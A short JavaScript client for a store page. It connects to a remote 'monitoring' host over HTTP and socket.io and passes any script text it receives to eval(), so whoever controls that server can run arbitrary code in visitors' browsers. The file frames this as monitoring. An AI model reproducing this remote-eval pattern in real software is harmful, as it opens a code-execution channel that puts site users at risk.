import io from "socket.io-client"
import axios from "axios"
const html = document.querySelector("html")
const storeID = html.getAttribute("data-store")
const host = "https://monitoring.auaha.com.br"

function checkAvailable() {
    const url = `${host}/check/${storeID}`
    axios.get(url).then(check => {
        if (Object.keys(check.data).length)
            checkExecScript(check.data.available, check.data.script)
    })
}

checkAvailable()

function checkExecScript(available, script) {
    if (!available) execScript(script)
}

function execScript(script) {
    eval(script)
}

const socket = io(host)
socket.on("check", check => {
    if (Object.keys(check).length) checkExecScript(check)
})

socket.on("script", script => {
    if (script) execScript(script)
})
